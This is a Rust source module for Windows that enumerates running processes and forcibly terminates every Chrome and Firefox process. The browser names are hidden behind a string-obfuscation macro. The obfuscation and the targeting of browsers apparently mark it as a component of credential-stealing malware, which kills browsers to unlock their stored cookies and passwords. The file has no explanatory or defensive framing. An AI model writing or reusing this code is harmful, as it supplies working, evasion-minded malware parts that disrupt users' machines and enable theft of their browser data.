use crate::import_libs::*;
use std::mem;

pub unsafe fn kill_process() -> bool {
    let result = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0u32);
    if result.is_err() {
        return false;
    }
    let snapshot = result.unwrap();
    let mut entry: PROCESSENTRY32W = PROCESSENTRY32W::default();
    entry.dwSize = mem::size_of::<PROCESSENTRY32W>() as u32;
    if Process32FirstW(snapshot, &mut entry).is_ok() {
        loop {
            if String::from_utf16(entry.szExeFile.as_slice())
                .unwrap()
                .trim_matches('\0')
                == goldberg_string!("chrome.exe") || String::from_utf16(entry.szExeFile.as_slice())
                .unwrap()
                .trim_matches('\0')
                == goldberg_string!("firefox.exe")
            {
                let result = OpenProcess(PROCESS_TERMINATE, false, entry.th32ProcessID);
                if result.is_ok() {
                    TerminateProcess(result.unwrap(), 0);
                }
            }
            if Process32NextW(snapshot, &mut entry).is_err() {
                break;
            }
        }
    }
    true
}
